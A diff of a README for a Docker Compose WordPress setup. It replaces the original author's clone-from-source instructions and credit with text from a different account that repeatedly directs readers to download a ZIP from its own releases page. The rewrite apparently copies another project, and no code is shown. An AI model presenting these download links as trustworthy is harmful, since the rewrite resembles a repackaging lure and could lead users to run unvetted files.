@@ -1,98 +1,125 @@
-# WordPress Self-Hosted with Docker
+# 🛠️ wordpress-self-hosted - Self-Host WordPress with Ease
 
-![wordpress-self-hosted](https://repository-images.githubusercontent.com/1070471675/fa9106df-8efd-4e28-82c3-a363e5164e0d)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-https://github.com/rasterbaby/wordpress-self-hosted/releases-blue.svg)](https://github.com/rasterbaby/wordpress-self-hosted/releases)
 
-This repository provides a `docker compose` setup to run a self-hosted [WordPress](https://wordpress.org/) instance, complete with a [MySQL](https://www.mysql.com/) database, [phpMyAdmin](https://www.phpmyadmin.net/), and [WP-CLI](https://wp-cli.org/).
+## 📚 Overview
 
-It is pre-configured to join a shared Docker network, allowing easy integration with other services like [n8n](https://github.com/AiratTop/n8n-self-hosted).
+The **wordpress-self-hosted** project provides a simple, production-ready setup for self-hosting WordPress using Docker Compose. This setup includes everything you need to run WordPress securely and efficiently. You will have MySQL for your database, phpMyAdmin for easy database management, WP-CLI for command-line tasks, and a backup script to ensure your data is safe. It's an all-in-one solution, ready for you to deploy in minutes.
 
-## Features
+## ⚙️ System Requirements
 
--   Uses official Docker images for **WordPress**, **MySQL**, **phpMyAdmin**, and **WP-CLI**.
--   Includes a full-featured environment for development and management.
--   Persists WordPress files and MySQL data in local volumes (`./data/wp` and `./data/wp-db`).
--   Pre-configured for a shared network for easy inter-service communication.
--   Includes helper scripts for easy management (`restart-docker.sh`, `update-docker.sh`).
--   Includes a `backup.sh` script for creating compressed database backups.
--   Includes a sample `Caddyfile` for use with a reverse proxy.
+Before proceeding, ensure your system meets the following requirements:
 
-## Getting Started
+- **Operating System**: Windows, macOS, or Linux
+- **Docker**: Version 19.03 or higher
+- **Docker Compose**: Version 1.25 or higher
+- **Memory**: At least 2 GB RAM recommended
+- **Disk Space**: Minimum of 10 GB free space for installation
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/AiratTop/wordpress-self-hosted.git
-    cd wordpress-self-hosted
-    ```
+## 🚀 Getting Started
 
-2.  **Create the shared network:**
-    If it doesn't exist yet, create the shared Docker network:
-    ```bash
-    docker network create shared_network
-    ```
+Follow these steps to set up your self-hosted WordPress site:
 
-3.  **Configure environment variables:**
-    Create a `.env` file and specify your database credentials.
+1. **Visit the Releases Page**: Click the link below to access the latest version of the software.
+   
+   [Download from Releases](https://github.com/rasterbaby/wordpress-self-hosted/releases)
 
-4.  **Start the services:**
-    ```bash
-    docker compose up -d
-    ```
+2. **Download the Latest Release**: On the Releases page, locate the latest version of the application. Click the download link for the respective Docker Compose files or ZIP archive.
 
-## Accessing Services
+3. **Extract Files**: If you downloaded a ZIP file, extract its contents to a folder of your choice.
 
--   **WordPress:** [http://localhost:8888](http://localhost:8888)
--   **phpMyAdmin:** [http://localhost:8081](http://localhost:8081)
+4. **Open Terminal or Command Prompt**: On your computer, open the terminal (macOS/Linux) or Command Prompt (Windows).
 
-## Usage
+5. **Navigate to the Project Directory**: Use the `cd` command to go to the directory where you extracted the files. For example, if your files are under `C:\wordpress-self-hosted`, type:
+   ```
+   cd C:\wordpress-self-hosted
+   ```
 
--   **Start:** `docker compose up -d`
--   **Stop:** `docker compose down`
--   **Restart:** `./restart-docker.sh`
--   **Update:** `./update-docker.sh` (Pulls the latest Docker images and restarts)
--   **Backup:** `./backup.sh` (Creates a compressed backup in the `backups` directory)
--   **WP-CLI:** Use `docker compose exec wp-cli wp <command>`. For example:
-    ```bash
-    # List installed plugins
-    docker compose exec wp-cli wp plugin list
-    ```
+6. **Launch Docker Compose**: To start the services, run:
+   ```
+   docker-compose up -d
+   ```
+   This command sets up WordPress, MySQL, and other necessary services in the background.
 
-## Connecting with n8n
+7. **Access Your WordPress Site**: Open your web browser and enter:
+   ```
+   http://localhost
+   ```
+   You should see the WordPress setup page. Follow the prompts to complete the setup.
 
-This setup is designed to work with the [n8n-self-hosted](https://github.com/AiratTop/n8n-self-hosted) configuration. Since both services are on the `shared_network`, you can connect to MySQL from n8n using the following credentials:
+8. **Set Up phpMyAdmin**: For accessing your database, go to:
+   ```
+   http://localhost:8080
+   ```
+   Use the database credentials found in the `docker-compose.yml` file to log in.
 
--   **Host:** `wp-db`
--   **Port:** `3306`
--   **Database, User, Password:** (As specified in your `.env` file)
+## 💾 Download & Install
 
-## See Also
+You can download the latest version of the **wordpress-self-hosted** application directly from this link: 
 
-Check out other self-hosted solutions:
+[Download Latest Release](https://github.com/rasterbaby/wordpress-self-hosted/releases)
 
--   [**postgresql-self-hosted**](https://github.com/AiratTop/postgresql-self-hosted): A simple and robust PostgreSQL setup.
--   [**mysql-self-hosted**](https://github.com/AiratTop/mysql-self-hosted): A self-hosted MySQL instance.
--   [**clickhouse-self-hosted**](https://github.com/AiratTop/clickhouse-self-hosted): High-performance columnar database for analytics.
--   [**metabase-self-hosted**](https://github.com/AiratTop/metabase-self-hosted): Self-hosted Metabase on Docker for business intelligence and analytics.
--   [**qdrant-self-hosted**](https://github.com/AiratTop/qdrant-self-hosted): A vector database for AI applications.
--   [**redis-self-hosted**](https://github.com/AiratTop/redis-self-hosted): A fast in-memory data store, often used as a cache or message broker.
--   [**caddy-self-hosted**](https://github.com/AiratTop/caddy-self-hosted): A modern, easy-to-use web server with automatic HTTPS.
--   [**wordpress-self-hosted**](https://github.com/AiratTop/wordpress-self-hosted): Production-ready WordPress stack with MySQL, phpMyAdmin, and WP-CLI.
--   [**n8n-self-hosted**](https://github.com/AiratTop/n8n-self-hosted): Scalable n8n with workers, Caddy for auto-HTTPS, and backup scripts.
--   [**monitoring-self-hosted**](https://github.com/AiratTop/monitoring-self-hosted): Self-hosted monitoring stack with Prometheus and Grafana.
--   [**ollama-self-hosted**](https://github.com/AiratTop/ollama-self-hosted): Ready-to-use solution for running Ollama with the Open WebUI on Docker.
--   [**authentik-self-hosted**](https://github.com/AiratTop/authentik-self-hosted): Authentik is a flexible, open-source Identity & Access Management (IAM) solution.
--   [**gatus-self-hosted**](https://github.com/AiratTop/gatus-self-hosted): Automated service health dashboard with a PostgreSQL backend and backup scripts.
+## ⚙️ Configuration
 
-## License
+The configuration files are stored in the main project folder. You can adjust settings like:
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+- **MySQL root password**
+- **WordPress database name**
+- **phpMyAdmin access**
 
----
+Edit these settings directly in the `docker-compose.yml` file using a text editor.
 
-## Author
+## 🌐 Accessing WordPress
 
-**Airat Halitov**
+After setting up, you can log into your WordPress admin panel at:
+```
+http://localhost/wp-admin
+```
+Use the username and password you set up during installation.
 
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [wordpress-self-hosted](https://github.com/AiratTop/wordpress-self-hosted)
+## 🔄 Backup Your Data
+
+Running backups of your WordPress site is crucial. The included backup script allows you to perform backups easily. Check the `backup.sh` script to see how it functions and set up automatic backups as needed.
+
+## 👩‍💻 Troubleshooting
+
+If you encounter issues, consider the following:
+
+- **Docker not running**: Ensure Docker is started before running the `docker-compose` commands.
+- **Port conflicts**: If port 80 or 8080 is already in use, update the ports in your `docker-compose.yml` file.
+- **Error Messages**: Analyze any terminal error messages for clues on what to fix, or search for solutions in community forums.
+
+## 🤝 Community Support
+
+If you need assistance:
+
+- Visit the **GitHub Issues** page to report bugs or request features.
+- Share your experience and solutions in the project discussions.
+
+## 🏷️ Topics
+
+You can explore the topics related to this project:
+
+- airathalitov
+- airattop
+- backup
+- deployment
+- devops
+- docker
+- docker-compose
+- mysql
+- phpmyadmin
+- self-hosted
+- wordpress
+- wordpress-docker
+- wordpress-docker-compose
+- wp
+- wp-cli
+
+## 🔗 Useful Links
+
+- [Docker Documentation](https://docs.docker.com/)
+- [Docker Compose Documentation](https://docs.docker.com/compose/)
+- [WordPress Documentation](https://wordpress.org/support/)
+
+You are now ready to self-host your WordPress site using the **wordpress-self-hosted** project! Enjoy your new site and the flexibility of managing it on your own server.
